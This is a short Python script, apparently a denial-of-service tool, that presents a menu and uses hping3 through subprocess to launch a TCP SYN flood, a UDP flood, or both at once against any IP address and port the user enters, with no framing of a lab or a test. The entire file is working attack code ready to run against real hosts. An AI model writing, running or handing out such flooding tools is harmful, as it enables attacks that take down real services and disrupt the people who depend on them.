import sys
import os
import signal
import subprocess

def signal_handler(sig, frame):
    print("\n[!] Attack stopped...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def tcp_syn_flood(target_ip, port):
    print(f"\n[*] TCP SYN FLOOD → {target_ip}:{port}")
    print("[*] Engaging hping3 engine for maximum flooding speed...")
    try:
        subprocess.run(["hping3", "--flood", "--syn", "-p", str(port), target_ip])
    except Exception as e:
        print(f"[!] Target error or hping3 missing: {e}")

def udp_flood(target_ip, port):
    print(f"\n[*] UDP FLOOD → {target_ip}:{port}")
    print("[*] Engaging hping3 engine for maximum flooding speed...")
    try:
        subprocess.run(["hping3", "--flood", "--udp", "-p", str(port), target_ip])
    except Exception as e:
        print(f"[!] Target error or hping3 missing: {e}")

def multi_vector(target_ip, port):
    print(f"\n[*] MULTI-VECTOR FLOOD → {target_ip}:{port}")
    print("[*] Warning: Launching two hping3 processes simultaneously...")
    try:
        p1 = subprocess.Popen(["hping3", "--flood", "--syn", "-p", str(port), target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p2 = subprocess.Popen(["hping3", "--flood", "--udp", "-p", str(port), target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p1.wait()
        p2.wait()
    except KeyboardInterrupt:
        p1.terminate()
        p2.terminate()
        print("\n[!] Multi-vector attack stopped.")

MENU = """
1. TCP SYN Flood
2. UDP Flood
3. Multi-Vector (SYN + UDP)
4. Exit
"""

def main():
    if os.geteuid() != 0:
        print("Run as root")
        sys.exit(1)

    print(MENU)
    choice = input("Choice: ")

    if choice == "4":
        sys.exit(0)

    target_ip = input("Target IP: ")
    port = int(input("Port (default 80): ") or "80")

    if choice == "1":
        tcp_syn_flood(target_ip, port)
    elif choice == "2":
        udp_flood(target_ip, port)
    elif choice == "3":
        multi_vector(target_ip, port)

if __name__ == "__main__":
    main()